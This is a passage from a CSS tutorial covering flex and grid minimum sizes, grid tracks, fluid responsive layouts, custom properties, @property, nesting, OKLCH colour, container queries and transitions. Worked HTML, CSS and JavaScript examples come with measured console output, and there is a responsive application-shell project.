</head>
<body>
  <div class="row" id="trap"><div class="icon">[i]</div><div class="text long">a_very_long_file_name_without_spaces.txt</div></div>
  <div class="row fixed" id="fixed"><div class="icon">[i]</div><div class="text">a_very_long_file_name_without_spaces.txt</div></div>
  <script>
    for (const row of document.querySelectorAll(".row")) {
      const text = row.querySelector(".text");
      console.log(`${row.id.padEnd(5)}: row 300px, text box ${text.getBoundingClientRect().width}px, ` +
                  `row scrollWidth ${row.scrollWidth}px -> ${row.scrollWidth > 300 ? "OVERFLOWS" : "fits"}`);
    }
  </script>
</body>
</html>
```

```console
$ cd flex && python3 ../../tools/page.py minwidth.html
trap : row 300px, text box 385.3125px, row scrollWidth 435px -> OVERFLOWS
fixed: row 300px, text box 250px, row scrollWidth 300px -> fits
```

`flex: 1` asked the text item to fit into the 250 px left after the icon, but its automatic minimum is the full file name, 385 px, so the row overflows to 435 px. With `min-width: 0` it shrinks to 250 px and the ellipsis can work.

### Deep & Tricky

**DT-13. Flex and grid items have an automatic minimum size equal to their min-content size, so `flex: 1`, `1fr`, and `width: 100%` do not guarantee that a child fits: one long URL or code line can push a whole layout wider than the screen. `text-overflow: ellipsis` and `overflow-wrap` appear to "not work" in flex items for the same reason. Set `min-width: 0` on flex items and use `minmax(0, 1fr)` instead of `1fr` for grid tracks that hold arbitrary content.** *(CSS Flexible Box Layout Level 1 §4.5 "Automatic Minimum Size of Flex Items"; CSS Grid Layout Level 1 §6.6; `1fr` is `minmax(auto, 1fr)`, §7.2.4)*

### Mastery check

1. **Explain.** Why does `overflow: hidden` on the text item also fix the overflow, even without `min-width: 0`?

## Topic 3C — Grid

## Unit 3.5 — Grid tracks and areas

**One-line summary:** CSS Grid places items into rows and columns at once: `grid-template-columns` defines tracks in fixed units, `fr` (a share of the leftover space), `minmax(min, max)`, and `repeat(auto-fill | auto-fit, …)`, while `grid-template-areas` names regions so that layout is readable and easy to rearrange at breakpoints.

```html
<!-- file: grid/grid.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Grid tracks</title>
  <style>
    body { margin: 0; }
    .g { display: grid; width: 600px; gap: 10px; }
    #fr      { grid-template-columns: 100px 1fr 2fr; }
    #minmax  { grid-template-columns: minmax(150px, 1fr) 3fr; }
    #fill    { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
    #fit     { grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); }
    #areas   { grid-template: "head head" 40px "side main" 1fr / 150px 1fr; height: 200px; }
    #areas .h { grid-area: head; } #areas .s { grid-area: side; } #areas .m { grid-area: main; }
  </style>
</head>
<body>
  <div class="g" id="fr"><div>a</div><div>b</div><div>c</div></div>
  <div class="g" id="minmax"><div>a</div><div>b</div></div>
  <div class="g" id="fill"><div>a</div><div>b</div></div>
  <div class="g" id="fit"><div>a</div><div>b</div></div>
  <div class="g" id="areas"><div class="h">head</div><div class="s">side</div><div class="m">main</div></div>
  <script>
    for (const g of document.querySelectorAll(".g")) {
      const cols = getComputedStyle(g).gridTemplateColumns;
      const items = [...g.children].map((d) => { const r = d.getBoundingClientRect();
        return `${d.textContent}@${r.left},${r.top - g.getBoundingClientRect().top} ${r.width}x${r.height}`; });
      console.log(`${g.id.padEnd(6)} columns: ${cols.padEnd(42)} ${items.join("  ")}`);
    }
  </script>
</body>
</html>
```

```console
$ cd grid && python3 ../../tools/page.py grid.html
fr     columns: 100px 160px 320px                          a@0,0 100x18  b@110,0 160x18  c@280,0 320x18
minmax columns: 150px 440px                                a@0,0 150x18  b@160,0 440x18
fill   columns: 142.5px 142.5px 142.5px 142.5px            a@0,0 142.5x18  b@152.5,0 142.5x18
fit    columns: 295px 295px 0px 0px                        a@0,0 295x18  b@305,0 295x18
areas  columns: 150px 440px                                head@0,0 600x40  side@0,50 150x150  main@160,50 440x150
```

- `100px 1fr 2fr`: 600 − 100 − 2 × 10 (gaps) = 480 px for 3 fr, so 160 and 320.
- `minmax(150px, 1fr) 3fr`: 590 px for 4 fr would make the first column 147.5 px — below its minimum — so it is fixed at 150 and `3fr` takes the remaining 440.
- `auto-fill` with `minmax(120px, 1fr)`: as many 120-px columns as fit (4, using 4 × 120 + 3 × 10 = 510 px), then the space is shared: 142.5 px each. Two items occupy two of the four columns.
- `auto-fit` is the same, except that empty tracks collapse to 0 — so the two items stretch across the whole row.
- Named areas: the header spans both columns, and the 1fr row takes the 150 px left of the 200-px height after the 40-px header and the gap.

### Mastery check

1. **Predict.** With `auto-fit` and five items instead of two in the 600-px grid, how wide is each column?

## Topic 3D — Responsive design

## Unit 3.6 — Fluid layouts and breakpoints

**One-line summary:** Responsive design is mostly *intrinsic*: let content and the browser decide sizes with `min()`, `max()`, `clamp()`, `fit-content`, `ch`, and viewport units, use grid's `auto-fill` for repeating items, and reserve media queries for the few points where the layout must change structure — expressed in `em`, so that they follow the user's font size.

```html
<!-- file: responsive/fluid.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Fluid values and breakpoints</title>
  <style>
    body { margin: 0; }
    h1 { font-size: clamp(1.5rem, 1rem + 2.5vw, 3rem); margin: 0; }  /* fluid, with limits */
    .wrap { width: min(100% - 2rem, 70ch); margin-inline: auto; }     /* readable line length */
    nav ul { display: flex; flex-direction: column; margin: 0; }
    @media (min-width: 48em) { nav ul { flex-direction: row; } }      /* 768px at 16px font */
    .tag { width: fit-content; }                                       /* shrink-wrap the content */
  </style>
</head>
<body>
  <div class="wrap" id="wrap">
    <h1 id="h">Fluid heading</h1>
    <nav><ul id="menu"><li>Home</li><li>Docs</li><li>Blog</li></ul></nav>
    <p class="tag" id="tag">a short tag</p>
  </div>
  <script>
    const cs = (id) => getComputedStyle(document.getElementById(id));
    console.log(`viewport ${innerWidth}px: h1 ${cs("h").fontSize}, wrap ${cs("wrap").width}, ` +
                `menu ${cs("menu").flexDirection}, tag ${cs("tag").width}`);
  </script>
</body>
</html>
```

```console
$ cd responsive && for w in 320 800 1400; do python3 ../../tools/page.py fluid.html --width $w; done
viewport 320px: h1 24px, wrap 288px, menu column, tag 66.6562px
viewport 800px: h1 36px, wrap 560px, menu row, tag 66.6562px
viewport 1400px: h1 48px, wrap 560px, menu row, tag 66.6562px
```

The heading grows with the viewport — 1rem + 2.5vw is 24 px at 320 px wide and 36 px at 800 — and is clamped at 48 px on the wide screen (it would otherwise be 51). The wrapper is the viewport minus 2 rem until it reaches 70 characters (560 px here), the comfortable maximum line length for reading. The menu turns from a column into a row at 48 em. The tag is exactly as wide as its text.

### Pattern

**P-4. Design mobile-first: write the narrow layout as the default and add `min-width` media queries for wider screens; prefer intrinsic techniques (`auto-fill`/`minmax`, `clamp()`, `min()`, flex-wrap) to breakpoints, and put breakpoints where the content breaks, not at device widths.** *(Practice; Ethan Marcotte, "Responsive Web Design", 2010; Jeremy Keith & Rachel Andrew, "Intrinsic web design")* *Trade-off:* intrinsic layouts are harder to describe in a design mock-up than three fixed artboards; agree with designers on rules ("cards at least 14 rem wide") rather than pixel positions.

### Mastery check

1. **Calculate.** At what viewport width does the `clamp()` heading reach its 3 rem maximum?

## Chapter 3 Project — A responsive application shell

### Requirements

Lay out a documentation site's shell — header, section navigation, main content with a grid of cards, and footer — with CSS Grid areas and cascade layers:

- On narrow screens, a single column with the navigation as a horizontally scrollable strip; from 48 em, the navigation becomes a 14-rem sidebar beside the content.
- Cards are at least 14 rem wide when the screen allows, as many per row as fit.
- The footer is at the bottom of the viewport on short pages.
- Nothing ever causes horizontal scrolling of the page — including a very long URL in the text.

Include a script that measures the layout and checks these requirements, and run it at 360, 768, and 1280 pixels wide.

### Reference solution

```html
<!-- file: project/layout.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Responsive application shell</title>
  <link rel="stylesheet" href="layout.css">
</head>
<body>
  <header class="site-header"><p class="logo">Acme Docs</p>
    <nav aria-label="Account"><a href="#">Sign in</a></nav></header>
  <nav class="sidebar" aria-label="Sections">
    <ul><li><a href="#">Getting started</a></li><li><a href="#">Guides</a></li>
        <li><a href="#">API reference</a></li><li><a href="#">Changelog</a></li></ul>
  </nav>
  <main>
    <h1>Guides</h1>
    <p>See https://docs.example.com/guides/installation/configuration/advanced-options-for-large-deployments for details.</p>
    <ul class="cards">
      <li class="card"><h2>Install</h2><p>Set up the toolchain.</p></li>
      <li class="card"><h2>Configure</h2><p>Options and defaults.</p></li>
      <li class="card"><h2>Deploy</h2><p>Ship it.</p></li>
      <li class="card"><h2>Monitor</h2><p>Watch it run.</p></li>
      <li class="card"><h2>Scale</h2><p>Grow it.</p></li>
    </ul>
  </main>
  <footer class="site-footer"><p>© Acme</p></footer>
  <script src="check.js"></script>
</body>
</html>
```

```css
/* file: project/layout.css */
@layer reset, layout, components;

@layer reset {
  *, *::before, *::after { box-sizing: border-box; }
  body, h1, h2, p, ul { margin: 0; }
  ul { padding: 0; list-style: none; }
}

@layer layout {
  body {
    min-height: 100dvh;                       /* the footer sits at the bottom of short pages */
    display: grid;
    grid-template:
      "header" auto
      "nav"    auto
      "main"   1fr
      "footer" auto / minmax(0, 1fr);        /* minmax(0, ...) lets the column shrink below content */
  }
  .site-header { grid-area: header; display: flex; justify-content: space-between; align-items: center;
                 gap: 1rem; padding: 0.75rem 1rem; }
  .sidebar     { grid-area: nav; padding: 0.5rem 1rem; }
  .sidebar ul  { display: flex; gap: 1rem; overflow-x: auto; }       /* a scrollable strip on phones */
  main         { grid-area: main; padding: 1rem; overflow-wrap: anywhere; }
  .site-footer { grid-area: footer; padding: 1rem; }

  @media (min-width: 48em) {                                         /* 768 px and up */
    body {
      grid-template:
        "header header" auto
        "nav    main"   1fr
        "footer footer" auto / 14rem minmax(0, 1fr);
    }
    .sidebar ul { flex-direction: column; overflow-x: visible; }
  }
}

@layer components {
  .cards { display: grid; gap: 1rem; margin-top: 1rem;
           grid-template-columns: repeat(auto-fill, minmax(min(100%, 14rem), 1fr)); }
  .card  { padding: 1rem; border: 1px solid #ccc; border-radius: 0.5rem; }
  .sidebar a { white-space: nowrap; }
}
```

```js
// file: project/check.js
// Measures the layout and checks the requirements at the current viewport size.
const box = (sel) => document.querySelector(sel).getBoundingClientRect();
const cards = [...document.querySelectorAll(".card")].map((c) => c.getBoundingClientRect());
const columns = new Set(cards.map((r) => Math.round(r.left))).size;
const side = box(".sidebar"), main = box("main"), foot = box(".site-footer");
const checks = {
  "no horizontal page scroll": document.documentElement.scrollWidth <= innerWidth,
  "sidebar beside main on wide screens, above it on narrow ones":
    innerWidth >= 768 ? side.right <= main.left : side.bottom <= main.top,
  "footer at the bottom of the viewport or below": Math.round(foot.bottom) >= innerHeight,
  "cards at least 14rem wide unless the screen is narrower": cards.every((r) => r.width >= Math.min(224, main.width - 32)),
};
console.log(`${innerWidth}x${innerHeight}: ${columns} card column(s), sidebar ${Math.round(side.width)}px wide`);
for (const [name, ok] of Object.entries(checks)) console.log(`  ${ok ? "PASS" : "FAIL"}  ${name}`);
```

```console
$ cd project && for w in 360 768 1280; do python3 ../../tools/page.py layout.html --width $w --height 900; done
360x900: 1 card column(s), sidebar 360px wide
  PASS  no horizontal page scroll
  PASS  sidebar beside main on wide screens, above it on narrow ones
  PASS  footer at the bottom of the viewport or below
  PASS  cards at least 14rem wide unless the screen is narrower
768x900: 2 card column(s), sidebar 224px wide
  PASS  no horizontal page scroll
  PASS  sidebar beside main on wide screens, above it on narrow ones
  PASS  footer at the bottom of the viewport or below
  PASS  cards at least 14rem wide unless the screen is narrower
1280x900: 4 card column(s), sidebar 224px wide
  PASS  no horizontal page scroll
  PASS  sidebar beside main on wide screens, above it on narrow ones
  PASS  footer at the bottom of the viewport or below
  PASS  cards at least 14rem wide unless the screen is narrower
```

Every requirement passes at all three sizes: one, two, and four card columns. Two lines of the style sheet do most of the defensive work — `minmax(0, 1fr)` for the content column and `overflow-wrap: anywhere` for the main text. Remove them and see what happens on the phone:

```console
$ cd project && sed 's/minmax(0, 1fr)/1fr/g; s/ overflow-wrap: anywhere;//' layout.css > broken.css && sed 's/layout.css/broken.css/' layout.html > broken.html && python3 ../../tools/page.py broken.html --width 360 --height 900
360x900: 1 card column(s), sidebar 478px wide
  FAIL  no horizontal page scroll
  PASS  sidebar beside main on wide screens, above it on narrow ones
  PASS  footer at the bottom of the viewport or below
  PASS  cards at least 14rem wide unless the screen is narrower
```

The page becomes 478 px wide on a 360-px screen. The surprise is *what* widened it: not the long URL, but the navigation strip. Its links are `nowrap`, so its min-content width is the width of all four links in a row; `overflow-x: auto` should have made it scroll, but the grid track's automatic minimum (DT-13) widened the column to fit the strip before the strip ever had a chance to overflow.

### Review checklist

- Which other content could widen the column — a `<pre>` block, a table, an image without `max-width`? Add them and run the checks.
- Replace the 48-em media query with a container query (Chapter 4). What changes?
- Is the source order (navigation before main) the right reading order for screen readers? Add a "Skip to content" link.

## Answers to the Chapter 3 prediction questions

**Unit 3.2, Q1.** `.card` is positioned (`relative`), so `z-index: 2` applies: the card's stacking context now sorts above `#n2` (z-index 1), and the menu appears on top again.

**Unit 3.4, Q1.** A scroll container (any `overflow` other than `visible`) has an automatic minimum size of 0, because its content can scroll instead.

**Unit 3.5, Q1.** Four 120-px columns fit; with five items, the fifth goes to a second row, and all four columns are used, each 142.5 px.

**Unit 3.6, Q1.** 1rem + 2.5vw = 3rem → 2.5vw = 32 px → vw = 12.8 px → a 1,280-px viewport.

# Chapter 4 — Modern CSS: Custom Properties, Container Queries, Colour, and Motion

*Goal: use the features that changed how CSS is written in the 2020s. Custom properties turn style sheets into systems of design tokens; typed properties make them animatable; nesting and modern colour functions remove most of the reasons for a preprocessor; container queries let a component respond to the space it is given rather than the screen; and transitions and animations, used with care for users who prefer less motion, make interfaces feel alive. The project is a themable card component whose whole palette changes with one number — after fixing the bug that made it not work the first time.*

**What you will be able to do after this chapter**

- Define, override, and compute with custom properties, and predict what happens to invalid values.
- Register typed properties with `@property` and animate them.
- Write nested CSS and modern colour (`oklch`, `color-mix`, relative colours, `light-dark()`).
- Build components that adapt to their container with container queries and container units.
- Write transitions and animations that start when they should and respect `prefers-reduced-motion`.

## Topic 4A — Variables in CSS

## Unit 4.1 — Custom properties

**One-line summary:** A property whose name starts with `--` holds any value; it cascades and inherits like any other property, `var(--name, fallback)` substitutes it at computed-value time, and JavaScript can read and set it — which makes custom properties the mechanism for design tokens, theming, and component APIs.

```html
<!-- file: vars/vars.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Custom properties</title>
  <style>
    :root { --brand: rebeccapurple; --space: 8px; }
    .card { --space: 16px; padding: var(--space); color: var(--brand); }   /* redefined for .card's subtree */
    .missing { color: var(--not-defined, teal); }                          /* fallback */
    .invalid { color: red; color: var(--space); }                          /* "16px" is not a colour */
    .math { --n: 3; width: calc(var(--n) * 50px); }
    .tokens { --gap: 1rem; --gap-l: calc(var(--gap) * 2); margin: var(--gap-l); }
  </style>
</head>
<body>
  <p id="root-p" style="padding: var(--space)">outside</p>
  <div class="card" id="card"><p id="inner" style="padding: var(--space)">inside</p>
    <p class="invalid" id="invalid">invalid</p></div>
  <p class="missing" id="missing">missing</p>
  <div class="math" id="math"></div>
  <div class="tokens" id="tokens"></div>
  <script>
    const cs = (id) => getComputedStyle(document.getElementById(id));
    console.log(`root p padding ${cs("root-p").padding}; inner p padding ${cs("inner").padding} (inherits --space from .card)`);
    console.log(`fallback colour: ${cs("missing").color}`);
    console.log(`invalid at computed-value time: ${cs("invalid").color} (the red declaration is gone)`);
    console.log(`calc with a unitless variable: width ${cs("math").width}`);
    console.log(`--gap-l as stored: "${cs("tokens").getPropertyValue("--gap-l")}", margin ${cs("tokens").marginTop}`);
    document.documentElement.style.setProperty("--brand", "darkgreen");
    console.log(`after setting --brand from JavaScript: card colour ${cs("card").color}`);
  </script>
</body>
</html>
```

```console
$ cd vars && python3 ../../tools/page.py vars.html
root p padding 8px; inner p padding 16px (inherits --space from .card)
fallback colour: rgb(0, 128, 128)
invalid at computed-value time: rgb(102, 51, 153) (the red declaration is gone)
calc with a unitless variable: width 150px
--gap-l as stored: "calc(1rem * 2)", margin 32px
after setting --brand from JavaScript: card colour rgb(0, 100, 0)
```

`--space` is 8 px at the root and 16 px inside `.card`: a custom property is scoped to the subtree where it is declared, and the inner paragraph inherits the card's value. A missing variable uses the fallback. `calc()` can multiply a unitless variable by a length. The custom property itself stores the *tokens* `calc(1rem * 2)`, not a length — it is just text until a real property uses it. Setting `--brand` on the root from JavaScript changes every element that uses it.

### Deep & Tricky

**DT-14. A `var()` that produces an invalid value for the property is not detected at parse time, so it does not fall back to an earlier declaration: the declaration becomes *invalid at computed-value time* and the property behaves as `unset` — inherited properties inherit, others take their initial value. In the example, `color: red; color: var(--space)` gives the inherited purple, not red.** *(CSS Custom Properties for Cascading Variables Level 1, §3.1 "Invalid Variables": "the declaration … computes to the property's inherited value or its initial value")* The browser cannot know at parse time what `var(--space)` will contain, so the usual "the last *valid* declaration wins" rule cannot apply.

### Mastery check

1. **Predict.** `.x { --w: 100px; width: var(--w) + 20px; }` — what is the width?

## Unit 4.2 — Typed properties with `@property`

**One-line summary:** `@property` registers a custom property with a syntax (`<angle>`, `<length>`, `<color>`…), an initial value, and an inheritance flag; the browser then rejects values of the wrong type and — because it knows how to interpolate them — can transition and animate them, which plain custom properties (just text) cannot do.

```html
<!-- file: anim/property.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Typed custom properties</title>
  <style>
    @property --angle { syntax: "<angle>"; inherits: false; initial-value: 0deg; }
    .plain, .typed { width: 100px; height: 100px; transition: --angle 1s linear, --raw 1s linear; }
    .typed { background: conic-gradient(from var(--angle), red, blue); }
    .plain { --raw: 0deg; background: conic-gradient(from var(--raw), red, blue); }
    .typed.on { --angle: 90deg; }
    .plain.on { --raw: 90deg; }
    .bad { --angle: 12px; }                     /* wrong type: ignored at parse time */
  </style>
</head>
<body>
  <div class="typed" id="typed"></div>
  <div class="plain" id="plain"></div>
  <div class="typed bad" id="bad"></div>
  <script>
    const val = (id, p) => getComputedStyle(document.getElementById(id)).getPropertyValue(p).trim();
    console.log(`--angle on a .bad element: "${val("bad", "--angle")}" (the initial value)`);
    document.getElementById("typed").classList.add("on");
    document.getElementById("plain").classList.add("on");
    setTimeout(() => {
      console.log(`after 500 ms: typed --angle = ${val("typed", "--angle")}, untyped --raw = ${val("plain", "--raw")}`);
    }, 500);
  </script>
</body>
</html>
```

```console
$ cd anim && python3 ../../tools/page.py property.html wait:600
--angle on a .bad element: "0deg" (the initial value)
after 500 ms: typed --angle = 45deg, untyped --raw = 90deg
```

Half-way through the one-second transition, the registered `--angle` is at 45deg, so the gradient rotates smoothly. The unregistered `--raw` jumped straight to 90deg: there is no way to interpolate between two pieces of text, so it flips at the start. The value `12px` for `--angle` is rejected because it is not an angle, leaving the initial value.

## Unit 4.3 — Nesting and modern colour

**One-line summary:** Native CSS nesting writes child rules inside their parent rule, with `&` standing for the parent selector; modern colour functions describe colours perceptually (`oklch(lightness chroma hue)`), mix them (`color-mix()`), derive new ones from existing ones (relative colour syntax), and pick light or dark variants from the user's preference (`light-dark()` with `color-scheme`).

```html
<!-- file: color/color.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Colour and nesting</title>
  <style>
    :root { color-scheme: light dark; --accent: oklch(55% 0.2 260); }
    body { background: light-dark(white, #111); color: light-dark(#222, #eee); }
    .button {
      background: var(--accent);
      &:hover { background: color-mix(in oklch, var(--accent), white 20%); }  /* & = the parent selector */
      .icon { margin-inline-end: 0.5em; }                                     /* nested descendant */
      &.danger { --accent: oklch(55% 0.2 25); }
    }
    .border { border: 2px solid oklch(from var(--accent) calc(l + 0.2) c h); } /* relative colour */
  </style>
</head>
<body>
  <button class="button" id="b"><span class="icon" id="i">*</span>Save</button>
  <button class="button danger" id="d">Delete</button>
  <div class="border" id="border">bordered</div>
  <script>
    const cs = (id) => getComputedStyle(document.getElementById(id));
    console.log(`scheme ${matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light"}: ` +
                `body background ${getComputedStyle(document.body).backgroundColor}, text ${getComputedStyle(document.body).color}`);
    console.log(`accent ${cs("b").backgroundColor}; danger ${cs("d").backgroundColor}`);
    console.log(`icon margin-inline-end ${cs("i").marginRight}; border ${cs("border").borderTopColor}`);
  </script>
</body>
</html>
```

```console
$ cd color && python3 ../../tools/page.py color.html
scheme light: body background rgb(255, 255, 255), text rgb(34, 34, 34)
accent oklch(0.55 0.2 260); danger oklch(0.55 0.2 25)
icon margin-inline-end 6.66667px; border oklch(0.75 0.2 260)
$ cd color && python3 ../../tools/page.py color.html --media dark
scheme dark: body background rgb(17, 17, 17), text rgb(238, 238, 238)
accent oklch(0.55 0.2 260); danger oklch(0.55 0.2 25)
icon margin-inline-end 6.66667px; border oklch(0.75 0.2 260)
$ cd color && python3 ../../tools/page.py color.html "hover:#b" "eval:getComputedStyle(document.getElementById('b')).backgroundColor"
scheme light: body background rgb(255, 255, 255), text rgb(34, 34, 34)
accent oklch(0.55 0.2 260); danger oklch(0.55 0.2 25)
icon margin-inline-end 6.66667px; border oklch(0.75 0.2 260)
=> "oklch(0.639999 0.16001 260)"
```

The page follows the user's colour scheme with no media query, through `light-dark()`. The danger button changes only its `--accent` variable. On hover, `color-mix` gives a lighter accent; the relative-colour border is the accent with lightness raised by 0.2. OKLCH is the right space for this kind of arithmetic: its lightness matches perceived lightness, so two colours with L = 55% look equally light whatever their hue — not true of HSL, where yellow and blue at "50% lightness" look very different.

### Deep & Tricky

**DT-15. A nested rule's `&` is equivalent to wrapping the parent selector in `:is()`, so nested selectors inherit `:is()`'s specificity rule (DT-9): inside `#nav, .menu { & a { … } }`, the nested rule is `:is(#nav, .menu) a` and has specificity (1,0,1) even where it matched through `.menu` — unlike the Sass expansion `#nav a, .menu a`, whose two selectors have different specificities.** *(CSS Nesting Module Level 1, §2 "Nesting Selector": "the nesting selector … has the same specificity as … :is()")*

### Mastery check

1. **Write.** A rule that gives a `.card` a red border only when it contains an image, using nesting and `:has()`.

## Topic 4B — Components that adapt

## Unit 4.4 — Container queries

**One-line summary:** `container-type: inline-size` makes an element a *query container*; rules inside `@container (min-width: …)` then apply according to that container's width, and container units (`cqi`, `cqw`…) are percentages of it — so one component can lay itself out correctly in a narrow sidebar and a wide main column on the same screen.

```html
<!-- file: container/container.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Container queries</title>
  <style>
    body { margin: 0; display: grid; grid-template-columns: 250px 1fr; gap: 20px; width: 900px; }
    .slot { container-type: inline-size; }                 /* the card asks its slot, not the viewport */
    .card { display: grid; gap: 8px; padding: 2cqi; }      /* 2% of the container's inline size */
    .card img { width: 100%; aspect-ratio: 16 / 9; }
    @container (min-width: 400px) {
      .card { grid-template-columns: 40% 1fr; }            /* image beside text when there is room */
    }
  </style>
</head>
<body>
  <aside class="slot" id="side"><article class="card"><img alt=""><p>Same card in the sidebar</p></article></aside>
  <main class="slot" id="main"><article class="card"><img alt=""><p>Same card in the main column</p></article></main>
  <script>
    for (const slot of document.querySelectorAll(".slot")) {
      const card = slot.querySelector(".card"), cs = getComputedStyle(card);
      console.log(`${slot.id}: slot ${slot.clientWidth}px, columns "${cs.gridTemplateColumns}", padding ${cs.paddingTop}`);
    }
  </script>
</body>
</html>
```

```console
$ cd container && python3 ../../tools/page.py container.html
side: slot 250px, columns "240px", padding 5px
main: slot 630px, columns "241.922px 354.891px", padding 12.6px
```

The same card, with the same CSS, is a single column in the 250-px sidebar and a two-column layout in the 630-px main area; its padding, 2 cqi, is 5 px in one and 12.6 px in the other. A media query could not do this — the viewport is the same for both.

### Deep & Tricky

**DT-16. An element cannot query itself — a container query looks for the nearest *ancestor* container — and `container-type: inline-size` applies size containment, so the container's own width can no longer depend on its content: a container in a shrink-to-fit context (an inline-block, a flex item with `flex: none`, a `width: fit-content` box) collapses to zero width.** *(CSS Containment Module Level 3, §3 "Size queries" and §4.1 `container-type`: "applies layout containment, style containment, and inline-size containment"; CSS Containment Level 2 §3.2 "Size containment")* That is why the card above is wrapped in a `.slot`: the slot is the container, the card is styled.

### Mastery check

1. **Explain.** Why does the specification make an element unable to query its own size?

## Unit 4.5 — Transitions, animations, and reduced motion

**One-line summary:** A transition animates a property from its old computed value to its new one when it changes; a keyframe animation runs on its own schedule; both are inspectable from JavaScript with `getAnimations()`; animating `transform` and `opacity` is cheap because it avoids layout; and the `prefers-reduced-motion` media query lets users with vestibular disorders turn motion off.

```html
<!-- file: anim/motion.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Transitions, animations, and reduced motion</title>
  <style>
    .box { width: 100px; height: 50px; transition: transform 400ms ease-out, opacity 400ms; }
    .box.moved { transform: translateX(200px); opacity: 0.5; }
    @keyframes pulse { from { scale: 1; } 50% { scale: 1.2; } to { scale: 1; } }
    .spinner { animation: pulse 1s ease-in-out infinite; width: 20px; height: 20px; }
    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after { animation-duration: 1ms !important; animation-iteration-count: 1 !important;
                               transition-duration: 1ms !important; }
    }
  </style>
</head>
<body>
  <div class="box" id="a"></div>
  <div class="box" id="b"></div>
  <div class="spinner" id="spin"></div>
  <script>
    const a = document.getElementById("a"), b = document.getElementById("b");
    a.classList.add("moved");                  // style never computed before: no "before" state
    getComputedStyle(b).transform;             // force a style computation of the start state ...
    b.classList.add("moved");                  // ... so this change can transition
    console.log(`reduced motion: ${matchMedia("(prefers-reduced-motion: reduce)").matches}`);
    for (const anim of document.getAnimations())
      console.log(`  running on #${anim.effect.target.id}: ${anim.constructor.name} ` +
                  `${anim.transitionProperty ?? anim.animationName}, ${anim.effect.getTiming().duration} ms, ` +
                  `iterations ${anim.effect.getTiming().iterations}`);
    setTimeout(() => console.log(`  after 200 ms: a ${getComputedStyle(a).transform}, ` +
                                 `b ${getComputedStyle(b).transform}`), 200);
  </script>
</body>
</html>
```

```console
$ cd anim && python3 ../../tools/page.py motion.html wait:300
reduced motion: false
  running on #b: CSSTransition opacity, 400 ms, iterations 1
  running on #b: CSSTransition transform, 400 ms, iterations 1
  running on #spin: CSSAnimation pulse, 1000 ms, iterations Infinity
  after 200 ms: a matrix(1, 0, 0, 1, 200, 0), b matrix(1, 0, 0, 1, 136.917, 0)
$ cd anim && python3 ../../tools/page.py motion.html wait:300 --media reduce
reduced motion: true
  running on #b: CSSTransition opacity, 1 ms, iterations 1
  running on #b: CSSTransition transform, 1 ms, iterations 1
  running on #spin: CSSAnimation pulse, 1 ms, iterations 1
  after 200 ms: a matrix(1, 0, 0, 1, 200, 0), b matrix(1, 0, 0, 1, 200, 0)
```

Box `b` transitions: 200 ms into the 400-ms ease-out transition it is at 137 px. Box `a`, given exactly the same class, jumps straight to 200 px — no transition was even created. With reduced motion requested, every animation and transition is shortened to 1 ms, so the end states are still reached (code waiting for `transitionend` keeps working) but nothing moves.

### Deep & Tricky

**DT-17. A transition needs a *before* style: if an element is created, or its style changed, and then changed again before the browser has computed its style, there is only one computed value and nothing to transition from — so adding a class right after inserting an element shows the end state instantly. Reading a computed value (`getComputedStyle(el).transform`, `el.offsetWidth`) forces a style computation in between; the modern alternative is `@starting-style { … }`, which declares the starting values for an element's first style change.** *(CSS Transitions Level 1, §3 "Starting of transitions": transitions start "when the computed value of a property changes" between style change events; CSS Transitions Level 2, `@starting-style`)* Forcing style in a loop is expensive (Chapter 13); `@starting-style` costs nothing.

### Pattern

**P-5. Animate only `transform`, `opacity`, and `filter` where possible, keep durations short (100–300 ms for interface feedback), and honour `prefers-reduced-motion` globally, by setting a duration token to 0 or replacing motion with a fade.** *(web.dev, "Animations and performance"; WCAG 2.2 Success Criterion 2.3.3 "Animation from Interactions")* *Trade-off:* removing motion entirely can remove information (where did that panel come from?); a short cross-fade usually keeps the meaning without the movement.

### Mastery check

1. **Explain.** Why are `transform` and `opacity` cheaper to animate than `left` or `width`?

## Chapter 4 Project — A themable card component

### Requirements

Build a card component with design tokens:

- All colours, radii, spacing, and durations come from custom properties in a `tokens` cascade layer; colours are OKLCH, derived from one `--hue` token, and follow the user's light or dark preference with `light-dark()`.
- A subtree with `data-theme="green"` gets a complete green palette by changing only `--hue`.
- The card is laid out by a container query: stacked when narrow, title and button side by side from 30 rem; its title size is fluid in container units.
- Motion uses a `--duration` token that becomes 0 under `prefers-reduced-motion`.

Verify colours, layout, and durations in light and dark mode, with and without reduced motion.

### Reference solution

```css
/* file: project/tokens.css */
/* Design tokens: every colour, size, and duration the components may use. */
@layer tokens {
  :root {
    color-scheme: light dark;
    --hue: 260;
    --radius: 0.5rem;
    --space-1: 0.5rem; --space-2: 1rem; --space-3: 1.5rem;
    --duration: 200ms;
  }
  [data-theme="green"] { --hue: 150; }                 /* a whole palette from one number ... */
  :root, [data-theme] {                                /* ... because the tokens are recomputed here */
    --color-bg:      light-dark(oklch(99% 0 0), oklch(18% 0.01 var(--hue)));
    --color-text:    light-dark(oklch(25% 0.02 var(--hue)), oklch(92% 0.01 var(--hue)));
    --color-accent:  oklch(55% 0.18 var(--hue));
    --color-surface: light-dark(oklch(96% 0.01 var(--hue)), oklch(24% 0.02 var(--hue)));
  }
  @media (prefers-reduced-motion: reduce) { :root { --duration: 0ms; } }
}
```

```css
/* file: project/card.css */
@layer tokens, components;

@layer components {
  body { background: var(--color-bg); color: var(--color-text); font-family: system-ui, sans-serif; }
  .card-slot { container: card / inline-size; }
  .card {
    background: var(--color-surface);
    border-radius: var(--radius);
    padding: var(--space-2);
    display: grid;
